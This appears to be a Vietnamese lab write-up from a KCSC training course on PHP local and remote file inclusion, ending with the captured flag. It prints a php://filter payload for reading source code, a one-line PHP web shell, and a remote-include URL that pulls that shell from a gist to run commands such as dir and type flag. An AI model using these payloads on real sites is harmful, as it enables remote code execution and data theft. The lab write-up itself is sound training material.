# Lab File Inclusion

## Local File Inclusion (LFI):

![](https://i.imgur.com/0Rva92V.png)

Source code: https://github.com/tu3n4nh/trainingKCSC/blob/main/task_7_file_inclusion/lab_file_inclusion/index.php

### Phân tích

Trang web trên sẽ hiển thị thêm thông tin vào file `index` dựa theo params `info` bằng phương thức GET sau khi ta bấm vào button `More info`.

![](https://i.imgur.com/0RvV0Mj.png)

Thử nhập vào params `info` ký tự bất kỳ:

![](https://i.imgur.com/09D37QM.png)

Ta thấy có lỗi `Warning: include(aaa.php): Failed... No such file or directory in`

Vậy là ta có thể xác định được khi click vào button `More info` thì file chứ thông tin về con vật trong params `info` sẽ được include vào trang `index` và hiện ra màn hình.

Dựa vào việc `include(aaa.php)` từ ngay trang `index.php` ta có thể tạm xác định folder hiện tại đang chứa những file như sau:

```
┐
├─index.php    // Chứa chứa hàm include()
├─cat.php      // File chứa thông tin về cat
├─cheems.php   // File chứa thông tin về cheems
└─pepe.php     // File chứa thông tin về pepe
```

### Khai thác

1. Ta sẽ sử dụng payload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
    Để đọc source code của từng file `index.php?info=php://filter/convert.base64-encode/resource=index`
    
    ![](https://i.imgur.com/GNWnU6M.png)
    
2. Decode đoạn base64 nhận được để nhận được source code:
    
    ![](https://i.imgur.com/fU2sZ2w.png)



## Remote File Inclusion (RFI):

![](https://i.imgur.com/0Rva92V.png

Source code: https://github.com/tu3n4nh/trainingKCSC/blob/main/task_7_file_inclusion/lab_file_inclusion/index.php

Chỉ file php.ini để cho phép include từ url.

![](https://i.imgur.com/3IDiLLQ.png)


### Phân tích

Trang web trên sẽ hiển thị thêm thông tin vào file `index` dựa theo params `info` bằng phương thức GET sau khi ta bấm vào button `More info`.

![](https://i.imgur.com/0RvV0Mj.png)

Thử nhập vào params `info` ký tự bất kỳ:

![](https://i.imgur.com/09D37QM.png)

Ta thấy có lỗi `Warning: include(aaa.php): Failed... No such file or directory in`

Vậy là ta có thể xác định được khi click vào button `More info` thì file chứ thông tin về con vật trong params `info` sẽ được include vào trang `index` và hiện ra màn hình.

Vì lab này cho phép include file từ url nên ta đã đủ thông tin để bắt đầu khai thác

### Khai thác

1. Tạo một file shell.php chưa payload RCE: `<?php echo system($_GET['cmd']); ?>` có thể trên `gist.github.com` sau đó lấy link vào truyền vào params `info`:
    Payload: `?info=https://gist.githubusercontent.com/tu3n4nh/a8078a98897200725ef254544e7a93b6/raw/23775cac4cf1b2c308a22e8647485f77cae248e0/shell`

    ![](https://i.imgur.com/znaYa8p.png)

    Thông báo lỗi như vậy chứng tỏ file shell của chúng ta đã thành công chạy trên website
    
2. RCE và ... làm những gì chúng ta muốn thôi:
    
    `&cmd=dir` để list ra các files có trong folder hiện tại
    
    ![](https://i.imgur.com/eKC09ax.png)

    Ctrl + U để cho dễ nhìn:
    
    ![](https://i.imgur.com/6UYSil4.png)

    `&cmd=type flag` để đọc file flag
    
    ![](https://i.imgur.com/a4rFvQ7.png)


=> **Flag: KCSC{F1l3 1nclu51on 15 v3ry d4ng3rou5!}**
